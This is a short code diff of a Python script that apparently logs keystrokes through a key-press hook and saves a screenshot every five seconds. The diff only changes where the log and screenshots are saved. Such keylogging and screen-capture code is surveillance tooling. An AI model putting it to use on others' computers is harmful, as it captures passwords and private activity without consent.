@@ -16,7 +16,7 @@ from datetime import datetime
 import pyautogui
 
 #change this to your log file's path
-folder='/home/simon/Desktop/'
+folder='my/output/folder'
 log_file=folder+'file.log'
 #global time
 time=datetime.now()
@@ -32,7 +32,7 @@ def OnKeyPress(event):
   #Every 5 sec we take a screenshot
   if ((datetime.now()-time).total_seconds()>5):
         pic = pyautogui.screenshot()
-        out_pic='screenshot_'+str(datetime.now())+'.png'
+        out_pic=folder+'screenshot_'+str(datetime.now())+'.png'
         pic.save(out_pic)
 
   if event.Ascii==96: #96 is the ascii value of the grave key (`)
